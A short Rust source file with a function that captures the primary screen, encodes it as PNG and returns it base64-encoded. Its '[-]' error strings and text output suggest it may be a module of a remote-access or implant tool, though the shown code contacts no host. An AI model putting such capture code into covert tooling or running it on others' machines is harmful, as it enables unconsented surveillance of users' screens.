use base64::{self, Engine};
use image::{ImageOutputFormat, RgbaImage};
use screenshots::Screen;
use std::io::Cursor;

pub fn screenshot() -> String {
    let screens = Screen::all().unwrap_or_default();
    if screens.is_empty() {
        return "[-] Error: No screens found".to_string();
    }

    let current_screen = &screens[0];
    match current_screen.capture() {
        Ok(image) => {
            let width = image.width();
            let height = image.height();
            let vec_bytes = image.to_vec();

            let img_buffer = RgbaImage::from_raw(width, height, vec_bytes)
                .expect("[-] Failed to create image buffer");

            let mut cursor = Cursor::new(Vec::new());

            match img_buffer.write_to(&mut cursor, ImageOutputFormat::Png) {
                Ok(_) => {
                    let png_bytes = cursor.into_inner();
                    Engine::encode(&base64::engine::general_purpose::STANDARD, &png_bytes)
                }
                Err(e) => format!("[-] PNG encoding failed: {}", e),
            }
        }
        Err(e) => format!("[-] Error capturing screenshot: {}", e),
    }
}
